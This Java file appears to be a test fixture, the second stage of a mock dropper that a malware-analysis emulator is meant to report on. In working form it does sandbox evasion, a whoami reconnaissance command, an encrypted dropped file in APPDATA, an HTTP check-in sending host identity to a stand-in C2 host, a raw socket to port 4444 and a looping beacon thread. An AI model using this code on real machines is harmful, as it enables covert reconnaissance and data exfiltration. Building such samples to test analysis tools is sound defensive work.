package dev.javabyte.guest;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * The second stage of the test dropper. It performs, in miniature, the behaviours an analyst
 * wants reported: environment checks, a process launch, a dropped file, an HTTP check-in, a raw
 * socket, a background thread and an exit. Under the emulator none of them really happen.
 *
 * <p>It is delivered to {@link Dropper} as an encrypted resource and must never be executed on
 * a real JVM; nothing in the test suite does so.
 */
public class Stage2 {

    public String run(String tag) throws Exception {
        String os = System.getProperty("os.name");
        String user = System.getProperty("user.name");
        if (isSandbox()) {
            return "sandbox detected";
        }

        Process whoami = Runtime.getRuntime().exec(new String[] {"cmd.exe", "/c", "whoami"});
        String identity = new BufferedReader(new InputStreamReader(whoami.getInputStream())).readLine();

        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec("0123456789abcdef".getBytes(StandardCharsets.US_ASCII), "AES"));
        byte[] sealed = cipher.doFinal((user + "@" + os).getBytes(StandardCharsets.UTF_8));

        File drop = new File(System.getenv("APPDATA"), "updater" + File.separator + "state.bin");
        drop.getParentFile().mkdirs();
        try (OutputStream out = new FileOutputStream(drop)) {
            out.write(sealed);
        }

        HttpURLConnection http = (HttpURLConnection) new URL("http://c2.example.test/gate?id=" + tag).openConnection();
        http.setRequestMethod("POST");
        http.setRequestProperty("User-Agent", "stage2/1.0");
        http.setDoOutput(true);
        http.getOutputStream().write(("identity=" + identity).getBytes(StandardCharsets.UTF_8));
        String command = new BufferedReader(new InputStreamReader(http.getInputStream())).readLine();

        try (Socket socket = new Socket("198.51.100.7", 4444)) {
            socket.getOutputStream().write("HELLO\n".getBytes(StandardCharsets.US_ASCII));
        }

        Thread beacon = new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(60_000);
                    new URL("http://c2.example.test/beacon").openStream().close();
                } catch (Exception e) {
                    return;
                }
            }
        }, "beacon");
        beacon.start();

        if ("exit".equals(command)) {
            System.exit(7);
        }
        return os + "/" + drop.getPath() + "/" + command;
    }

    /** An environment check that a config hook can override. */
    static boolean isSandbox() {
        return new File("C:\\sandbox\\marker.txt").exists();
    }
}
